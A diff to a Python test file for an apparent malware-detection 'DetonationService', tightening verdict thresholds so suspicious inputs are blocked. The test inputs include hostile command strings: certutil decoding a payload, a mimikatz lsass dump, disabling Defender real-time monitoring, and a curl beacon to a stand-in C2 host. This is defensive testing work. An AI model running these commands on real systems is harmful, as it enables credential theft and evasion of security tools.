@@ -55,6 +55,12 @@ def test_detonate_text_clean_payload_low_confidence(svc: DetonationService) -> N
     assert result.confidence == 0.18
 
 
+@pytest.mark.parametrize("score", [float("nan"), float("inf"), float("-inf"), -0.1])
+def test_nonfinite_or_negative_scores_block(svc: DetonationService, score: float) -> None:
+    verdict, _ = svc._resolve_verdict(score)
+    assert verdict == "block"
+
+
 def test_detonate_text_returns_detonation_assessment(svc: DetonationService) -> None:
     result = svc.detonate_text("harmless text")
     assert isinstance(result, DetonationAssessment)
@@ -149,16 +155,16 @@ def test_detonate_text_detects_archive_unpack(svc: DetonationService) -> None:
 # ---------- detonate_text — verdict thresholds ----------
 
 
-def test_detonate_text_monitor_verdict_at_medium_score(svc: DetonationService) -> None:
+def test_detonate_text_blocks_at_low_signal_score(svc: DetonationService) -> None:
     result = svc.detonate_text("certutil -decode payload.txt out.exe")
-    assert result.verdict in {"monitor", "review", "block"}
+    assert result.verdict == "block"
     assert result.score >= 0.22
 
 
-def test_detonate_text_review_verdict_high_score(svc: DetonationService) -> None:
+def test_detonate_text_blocks_at_high_score(svc: DetonationService) -> None:
     payload = "lsass dump via mimikatz\nSet-MpPreference -DisableRealtimeMonitoring $true\ncertutil -decode payload.txt out.exe\ncurl https://c2.attacker.com/beacon\n"
     result = svc.detonate_text(payload)
-    assert result.verdict in {"review", "block"}
+    assert result.verdict == "block"
     assert result.score >= 0.56
 
 
